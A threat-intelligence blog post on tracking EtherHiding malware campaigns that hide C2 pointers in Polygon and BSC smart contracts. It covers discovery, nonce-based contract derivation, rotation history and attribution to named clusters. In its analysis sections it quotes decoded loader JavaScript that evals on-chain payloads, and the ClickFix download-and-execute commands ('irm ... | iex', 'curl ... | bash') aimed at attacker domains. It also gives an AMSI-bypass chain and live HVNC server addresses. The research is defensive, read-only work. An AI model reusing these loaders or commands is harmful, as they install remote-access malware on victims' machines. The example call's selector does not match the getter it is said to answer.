---
title: "Hunting EtherHiding at Scale: An On-Chain Campaign Tracker"
date: 2026-09-07
author: "Manuel Boll"
tags: ["Research","Threat Intelligence","EtherHiding","ClickFix","Blockchain","Polygon","BSC"]
description: "EtherHiding hides a malware campaign's C2 pointer inside a smart contract, read back with a stealthy eth_call. I built a tracker that seeds contracts from urlscan, reads them with eth_call, derives every other contract an operator ever deployed from the deployer nonce, and reconstructs the full C2-rotation history by bisecting block height. Run for a few weeks it mapped 381 contracts across 63 wallet clusters, and the clusters line up with named campaigns like UNC5142/CLEARSHORT."
image: "/img/posts/etherhiding.svg"
images: ["/img/posts/etherhiding.png"]
---


Every EtherHiding writeup I have read ends on the same note. The crew moved their command-and-control pointer onto a blockchain, the storage is immutable and public, so it cannot be taken down. True, and also the least interesting thing about it. Immutable and public cuts both ways. The same properties that make the pointer impossible to seize make it trivial to read, and the wallet that wrote it sits right next to the value it wrote.

So I stopped thinking about disruption and started thinking about visibility. This post is the tracker I built to watch these campaigns from the chain: how it finds the contracts, how it walks from one contract to an operator's whole estate, how it recovers every C2 domain a contract ever served, and what fell out when I pointed it at a few weeks of live traffic.

- - -

## 0. TL;DR

EtherHiding stores the next hop of an attack, a C2 domain or a whole JavaScript stage, inside a smart contract. A compromised website reads it back with a read only `eth_call`, which leaves no transaction, no domain in the page source, and nothing to seize.

I built a tracker around four moves:

1. Seed candidate contracts from urlscan (pages that phone a blockchain RPC).
2. Read each one with `eth_call` and decode what it hands out.
3. Take every operator wallet I know and derive all of its contracts from the deployer
   nonce, so I stop depending on what urlscan happened to catch.
4. Bisect block height to pull back every domain a contract ever served, with dates.

Nightly, for a few weeks, that gave me 381 delivery contracts in 63 wallet clusters and a long tail of one offs. The last section is the fun part: the clusters are not anonymous. One of them is UNC5142 down to the function names Mandiant published.

Everything here is read only. I never touched attacker infrastructure, domains are defanged, and there is a dataset at the end for detection work.

## 1. What sits on the chain

The loader is injected into a hacked site. Almost always WordPress, usually with Elementor or WooCommerce, and the injection is a single inline `<script>` in the `<head>`. Instead of hard coding where to go next, the script calls a contract and reads a string back. Because `eth_call` is a read, it never mines a transaction, so you will not find it by watching the chain for writes. The operator updates the campaign with one cheap `set()` call that overwrites the stored value, and on Polygon that costs a fraction of a cent.

There is not one shape of this. Across the corpus I see two:

- **Polygon, one contract one domain.** The contract returns a cleartext host like
  `cloud-safe[.]click` or `istile-c-cloud[.]beer`. Rotation is a new string. This is
  the bulk of the data, and the `.beer` `.sbs` `.cfd` `.icu` TLD habit makes it easy
  to eyeball.
- **BSC testnet, a graph of contracts.** Free to deploy off a faucet, readable by
  anyone, and mostly off the feeds. Here the whole delivery chain lives on chain, a
  dispatcher that fingerprints the browser and routes to a separate contract per
  operating system. I pull that one apart in section 6.

I keep the infrastructure in PocketBase and the actual IOCs in MISP. PocketBase holds the graph: operators, campaigns, contracts, and the typed edges between them. MISP holds the domains, one rolling event per cluster. The split matters later, because the thing that makes this trackable is the graph, not the domains.

## 2. Reading a contract by hand

The tracker runs those four moves in order, discovery first. None of it makes sense until you have read one contract by hand though, so I will flip the order for a minute and start there. Here is a Polygon store contract answering `getDomain()`. The selector is the first four bytes of `keccak256("getDomain()")`, which is `0xb68d1809`.

```bash
curl -s https://polygon-bor-rpc.publicnode.com -H 'content-type: application/json' -d '{
  "jsonrpc":"2.0","id":1,"method":"eth_call",
  "params":[{"to":"0x08207b087f61d7e95e441e15fd6d40befd6ed308","data":"0x38bcdc1c"},"latest"]
}'
```

Pick any public Polygon RPC that still answers unauthenticated. `polygon-rpc.com` started returning `tenant disabled` at some point, `publicnode` and `drpc` were fine when I wrote this. The campaign does not care which gateway you read from, and neither should you.

What comes back is one long hex word. A Solidity `string` return is ABI encoded as three parts: a 32 byte offset, then at that offset a 32 byte length, then the bytes, right padded to a multiple of 32. Decoding it is boring on purpose:

```python
def decode_abi_string(hexret):
    h = hexret[2:] if hexret.startswith("0x") else hexret
    off = int(h[0:64], 16) * 2          # byte offset -> hex nibble offset
    ln  = int(h[off:off+64], 16) * 2
    return bytes.fromhex(h[off+64: off+64+ln]).decode("utf-8", "replace")
```

For that contract the string was `coal.albaikmenuonline[.]com` when I first ran it. Run it now and you get whatever they rotated to since, which is the whole point. That is one contract, today's value. The interesting stuff is everything you cannot see from this single call: the other contracts this operator deployed, and every domain this one served before today. The rest of the post is about getting those two things without an explorer and without an API key.

A quick note on selectors, because they turn into a fingerprint. Each kit family uses a consistent getter. `0xb68d1809` is `getDomain()`, `0x38bcdc1c` is `getURL()`, `0x3bc5de30` is `getData()`, `0x6d4ce63c` is the plain `get()` the BSC testnet kit uses, and `0x24513bb6` is the tracker's check function. When I resolve selectors through 4byte.directory during ingestion, the getter alone tells me which family a new contract belongs to before I have decoded a single byte of payload.

## 3. Finding them: the urlscan seed

That single call is the primitive. Now the pipeline that runs it at scale, starting with move one, discovery.

An EtherHiding loader has to reach an RPC gateway from the victim browser, and urlscan records outbound requests per scan. So discovery is one query: pages that talked to a known RPC host, minus the legitimate Web3 hosting platforms where such calls are normal.

```
(domain:polygon-rpc.com OR domain:rpc.ankr.com OR
 domain:data-seed-prebsc-1-s1.bnbchain.org OR domain:polygon.drpc.org OR ...)
AND NOT (page.domain:vercel.app OR page.domain:netlify.app OR page.domain:pages.dev OR ...)
AND date:>now-2d
```

The exclusion list does the heavy lifting. A real dApp on `*.vercel.app` hits the same RPCs for good reasons, and without the filter half your hits are noise. What is left is overwhelmingly small business sites that have no reason to be talking to Polygon: a plumber in Ohio, a bakery, a regional logistics firm. For each hit I pull the result JSON, dig the `eth_call` POST body out of the recorded requests, replay it against a public RPC, and decode the return. That gives me the contract address, the chain, the selector, and the live payload in one shot.

This step alone finds maybe five percent of the real infrastructure. urlscan only ever sees the contracts that happened to fire on a page someone scanned. To get the rest I have to leave urlscan behind and go to the chain.

## 4. From one contract to all of them

Here is the part I have not seen in any public writeup, and it is the reason the tracker scales. An EVM contract address created with `CREATE` is fully determined by who deployed it and the nonce they were on:

```
address = keccak256( rlp_encode([deployer, nonce]) )[12:]
```

RLP encoding of that pair is small and fixed for the nonces we care about. For a 20 byte address and a nonce below 128 it is `0xd6 0x94 <20 bytes> <nonce>`, and above that the nonce grows a length prefix. So if I know one operator wallet, I can compute every address it has ever created, from nonce zero to its current nonce, offline, before touching the network:

```python
import rlp
from Crypto.Hash import keccak

def contract_address(deployer_hex, nonce):
    raw = rlp.encode([bytes.fromhex(deployer_hex[2:]), nonce])
    return "0x" + keccak.new(digest_bits=256, data=raw).hexdigest()[24:]
```

Then one batched `eth_getCode` over that list keeps the addresses that actually have bytecode, I probe each survivor's getter to confirm it is an EtherHiding store, and I upsert the new ones. One known contract gives me the wallet. The wallet gives me every contract it ever made. This is how the corpus went from "what urlscan saw" to 381 contracts, and it is how I find a fresh contract the night it is deployed, before it appears on a single scanned page. That set, one wallet and every contract it deployed, is what I call a cluster. It is the unit everything downstream hangs off, so when I say cluster later, I mean a wallet and its contracts.

The public writeups reconstruct history by decoding setter transactions through a block explorer. That works, but it needs an explorer, it costs API budget, and it only ever sees contracts you already know about. Deriving forward from the nonce needs neither, and it surfaces siblings and not yet used contracts that no scan has ever touched. The one wrinkle is testnet wallets with six figure nonces, where deriving the full history is wasteful, so I cap the window to the most recent N nonces and walk it incrementally.

![PocketBase operators sorted by nonce, the BSC-testnet owner sitting at a six-figure nonce next to the small Polygon deployers](/img/posts/etherhiding/01_pocketbase_operators.png)

## 5. Recovering rotation history

The getter only ever returns today's value. Every earlier domain was overwritten by a `set()`. But a contract's stored value is a step function over block height, and an archive node will answer `eth_call` at any past block. So I treat the whole lifetime of the contract as a range and bisect it for every value change:

```python
def history(rpc, addr, selector, lo, hi):
    changes = [(lo, read_at(rpc, addr, selector, lo))]
    def rec(a, va, b, vb):
        if b - a <= 1 or budget_exhausted():
            if va != vb: changes.append((b, vb))
            return
        m  = (a + b) // 2
        vm = read_at(rpc, addr, selector, m)
        if va != vm: rec(a, va, m, vm)
        if vm != vb: rec(m, vm, b, vb)
    rec(lo, changes[0][1], hi, read_at(rpc, addr, selector, hi))
    return sorted(changes)
```

Every change point is a block number, and a block number is a timestamp, so I get the exact sequence of domains and the window each one was live. One BSC testnet store gave up 849 distinct domains this way. The whole thing runs against public archive RPC with no explorer and no traces. It is the same idea a `git bisect` uses, pointed at chain state instead of commits.

Two things make this messy in practice. Some contracts return `0x` because the operator emptied the store, which reads as "rotated out, dormant" rather than a value. And the archive call budget matters, because a contract with a hundred changes over two years will happily eat a thousand calls if you let the recursion run unbounded, so I cap depth per contract and mark the ones I fully mined so the weekly job skips them.

## 6. What the payloads actually do

That is the hunting machinery: seed, read, expand, mine. Now what does it actually catch?

Reading a domain out of a store is one thing. The BSC testnet cluster is where the whole attack lives on chain, so it is worth walking end to end.

The entry contract is a dispatcher. Its `get()` returns base64, and once you decode it you get a small loader whose only job is to route by operating system:

```js
const load_ = async (address) => {
  const body = JSON.stringify({method:"eth_call",
    params:[{to:address,data:"0x6d4ce63c"},"latest"],id:97,jsonrpc:"2.0"});
  const rpcs = ["https://data-seed-prebsc-1-s1.bnbchain.org:8545/", /* ...8 of them... */];
  const call = u => fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},body})
    .then(r=>r.json()).then(e=>{ /* ABI-decode the string */ });
  try { eval(atob(await Promise.any(rpcs.map(call)))) } catch {}
};
const isWindows = navigator.userAgent.includes("Windows") || navigator.platform.startsWith("Win");
const isMac     = navigator.userAgent.includes("Macintosh") || navigator.platform.startsWith("Mac");
if (isHeadless() || isLocalhost()) console.log("stop watching us :)");
else if (isWindows) load_("0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff");
else if (isMac)     load_("0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5");
```

So the dispatcher does not carry the payload. It carries two more contract addresses, one per OS, and calls `load_` on the right one, which fetches that contract's `get()` across a pool of eight testnet RPCs, decodes the ABI string itself, and `eval`s it. The `isHeadless` check bails out for sandboxes with a cheeky log line. The Windows stage is about 35 KB of decoded JavaScript that renders a fake "Verification Steps" overlay and copies a command to the clipboard with `navigator.clipboard.writeText()`.

The third contract is a tracker, and it is the tell that this is a managed operation rather than a spray. The overlay builds a call to selector `0x24513bb6` with the victim's UUID and asks the chain whether this victim was already handled:

```js
const uuid  = getUserID();               // cjs_id cookie, seeded from an IP lookup
address     = "0xf4a32588b50a59a82fbA148d436081A48d80832A";
// build eth_call to 0x24513bb6 with the UUID, then:
isGoalReached(uuid).then(hit => { if (!hit) showOverlay(); });
```

`getUserID` seeds the UUID from `ip-info.ff.avast.com`, which is a free IP echo service, and on success the operator writes the victim IP back on chain with an `addtoList()` call, so the contract doubles as a deduplicated infection ledger. On top of that the overlay fires a Yandex Metrika `reachGoal` event, so the crew has a conversion dashboard for how many people saw the lure versus pasted the command.

The command itself, recovered in cleartext from decoded stages and decrypted panel responses:

```text
Windows (Cluster 007/008):  irm (...internetserchinkas[.]co/hex/lom/<hash>) | iex
Windows (Cluster 054):      irm('https://cf-check[.]site/hex/traffic') | iex
macOS   (Cluster 021):      /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.www-cardioslim[.]com/?ublib=${uuid__}')"
```

Cluster 054 is the one chain I could follow past the clipboard. `/hex/traffic` patches AMSI by flipping `amsiInitFailed`, an XOR layer pulls `/hvnc/hex`, and a WMI launched hidden PowerShell fetches the final `.ps1` from `tioiaosod[.]icu`. The `/hvnc/` path is not decoration. urlscan caught the Hidden VNC backend live on `130.61.68.232:7317` and `130.162.240.8:7317` answering `/api/hvnc/register` and `/api/hvnc/screenshot`.

The Polygon side and the older BSC ClearFake cluster wrap the same idea in more ceremony. Cluster 001, which turns out to be a named actor, stores a gzip blob and a tiny loader that unpacks and runs it:

```js
const teaCeremony = async (encodedScroll, templeNumber) => {
  const haiku = pako.ungzip(Uint8Array.from(atob(encodedScroll), c => c.charCodeAt(0)),
                            { to: 'string' }).trim();
  await eval(`(async () => { ${haiku} })()`);
};
await teaCeremony(await orchid.methods.shibuyaCrossing().call(), 2);
await teaCeremony(await orchid.methods.akihabaraLights().call(), 3);
await teaCeremony(await orchid.methods.ginzaLuxury().call(),     4);
await teaCeremony(await orchid.methods.asakusaTemple().call(),   5);
```

Those method names matter in section 8. The contract that hands out the ABI for this, `0x9179dda8...`, literally returns a JSON ABI listing `shibuyaCrossing`, `akihabaraLights`, `ginzaLuxury`, `asakusaTemple`, and their `set*` counterparts. It is a config contract that describes the loader contract that reads the store contract, a three part split that the crew reuses across chains.

One honest caveat runs through all of this. I recovered the loaders and the pasted commands, but the second stage binaries, the ZIPs and EXEs and DMGs, were never present as a body in any scan. Where I say stealer or RAT, that is the shape of the TTP, not a confirmed family. The one exception is Cluster 054, where the HVNC backend is live and answering, which is about as close to confirmed capability as you get without the binary.

## 7. The kill chain

Here is the BSC testnet chain end to end. Everything between the two rules is a read against public chain state, the part that leaves no network indicator for a defender to catch.

```
victim browser
     │   hits a compromised WordPress site
     ▼
injected <script> in <head>
     │   eth_call get()  ->  dispatcher contract 0xa1decfb7...
     ▼
===============  on-chain reads: no transaction, no takedown target  ===============
   dispatcher fingerprints the browser and routes by OS
        │                                     │
    isWindows                              isMac
        ▼                                     ▼
  win stage 0x46790e2a...             mac stage 0x68dce15c...
        │                                     │
        └────────────────┬────────────────────┘
                         ▼
      tracker 0xf4a32588...   isGoalReached() suppresses repeat victims,
                         │     addtoList() writes the victim IP back on-chain
===================================================================================
                         ▼
   fake "Verification Steps" overlay copies a command to the clipboard
   (a Yandex Metrika reachGoal event fires here, the crew's conversion counter)
                         │
                         ▼
   Windows:  irm ( ...internetserchinkas[.]co/hex/lom/<hash> ) | iex
   macOS:    /bin/bash -c "$( curl -fsSL ...www-cardioslim[.]com/... )"
                         │
                         ▼
   stage-2 host  ->  stage-3 .ps1 dropped in %TEMP%, AMSI patched, run hidden
                         │
                         ▼
   HVNC backend  130.61.68.232:7317   /api/hvnc/register
```

The Polygon model collapses that to a single node: compromised site, one `eth_call` returning a `.beer` domain, and a fake CAPTCHA on that domain doing the same clipboard trick. Same kill chain, fewer contracts.

## 8. Putting names to clusters

I have shown how the tracker works and what the payloads do. The last question is who runs them.

Clustering by deploying wallet, the way I defined it in section 4, gives 63 numbered groups. On chain money flow collapses most of them onto a handful of operators. Shared funder wallets feed several clusters at once, `0xb92fe925...` funds six of the Polygon groups and `0x71d42490...` funds four more, and one operator cashes out through a Cryptomus payment address. So the 63 clusters are really a few crews running many wallets.

Then the clusters resolve to names. I match contract addresses, deployer wallets, and selectors against public reporting, and the overlap is exact, not thematic:

| My cluster | Deployer / key contract | Public identity | Source |
|---|---|---|---|
| Cluster 001 | `0xf5b962cc...`, router `0x9179dda8...` | UNC5142 / CLEARSHORT | Google/Mandiant GTIG, Oct 2025 |
| Cluster 003 / 012 | `0xcaf2c54e...`, `getDomain 0xb68d1809` | LenAI "Aeternum" loader | Unit 42, filescan, Aug 2026 |
| Cluster 004 | `0x34c15320...`, `getURL 0x38bcdc1c` | ErrTraffic "BW" kit | PhishEye, LevelBlue, 2026 |
| Cluster 008 | `0x2f9091ab...` | Cribl SecOps cluster | Cribl, Aug 2026 |
| Cluster 021 | `0xd71f4cdc...`, dispatcher `0xa1decfb7...` | BSC testnet ClearFake | Trend Micro, Netskope, Censys |

Cluster 001 is the confirmation I trust most, and it is the reason those `teaCeremony` method names are in section 6. Mandiant's UNC5142 report describes a Router, Logic, and Storage split, names `shibuyaCrossing` and `akihabaraLights` and the rest, and traces the operator funding to an OKX hot wallet. My tracker surfaced all of that from the chain before I opened their report.

One caveat on the naming, since I looked it up while writing this. UNC5142 is not in the MISP threat-actor galaxy, so there is no canonical `misp-galaxy:threat-actor="UNC5142"` tag to hang on it. The closest handle that does resolve is the malware family, `misp-galaxy:malpedia="ClearFake"`. Its DPRK sibling UNC5342 is in the galaxy, which is an easy mix-up to make.

The money flow also coughed up indicators that are in nobody's report yet. A Polygon wallet, `0x2a4ff9e5...`, rotates four admin gated contracts in the exact ErrTraffic pattern but appears in no public writeup, and two funding wallets tie by other researchers' work to the TELEPUZ and Remus infostealer infrastructures.

![One cluster's rolling MISP event, Cluster 021 with 853 domain attributes, each tagged as C2 with the serving contract and its role recorded in the comment](/img/posts/etherhiding/02_misp_cluster.png)

## 9. Where it breaks

- Testnet attribution stays open. The BSC testnet ClearFake cluster is described by
  several vendors and attributed by none. Trend Micro gestures at DPRK, Mandiant ties
  ClearFake to a financially motivated crew. I match the infrastructure, not the actor,
  and I am not going to pretend otherwise.
- On chain money is not identity. Shared funders and cash out addresses cluster
  operations, they do not name a person. The one real identity pivot I have not pulled
  is an ENS registration paid for by one of the Ethereum operator wallets, which is a
  name someone chose and a thread worth following.
- Some payloads beat me. A set of CryptoJS `Salted__` AES blobs on Polygon never
  decrypted, because the key is not derivable from the address or the deployer, and I
  am not going to brute force a passphrase and call it research.
- No family names for the endpoints. The binaries were never in a scan body, so the
  TTP is as far as I will go.

## 10. Dataset

I am publishing the cluster map as a snapshot. There are two files. `etherhiding_clusters.json` is the structured version, each cluster with its operator wallets, its contracts (address, chain, role, payload class, deploy date, deployer, owner), and its indicators carrying first seen, last seen, and whether they are live or rotated out. `etherhiding_domains.csv` is the flat feed of those same indicators for a SIEM or a quick grep. This cut holds 381 contracts and 1467 indicators across 69 groups, the 63 numbered clusters plus the per-chain unclustered buckets for contracts I could not tie to a wallet.

One thing to be clear about. This is an excerpt, not the whole picture. The tracker runs every night and the crews keep deploying contracts and rotating domains, so the file is a snapshot from the day I exported it, and the counts will already be higher by the time you read this. Treat it as a starting point, not a closed case.

It is meant for detection work. Block the RPC pools rather than a single endpoint, alert on non DeFi processes issuing `eth_call`, and correlate the `.beer` and `.cfd` rotation against your own web telemetry. Values are real, not defanged, so they import straight.

Download: [etherhiding_clusters.json](/data/etherhiding_clusters.json) and [etherhiding_domains.csv](/data/etherhiding_domains.csv).

The tooling is a few hundred lines of standard library Python around `eth_call`, the CREATE derivation in section 4, and the bisection in section 5. No web3 dependency, no explorer key, no paid API. The chain is a public database, and the operators keep writing to it.
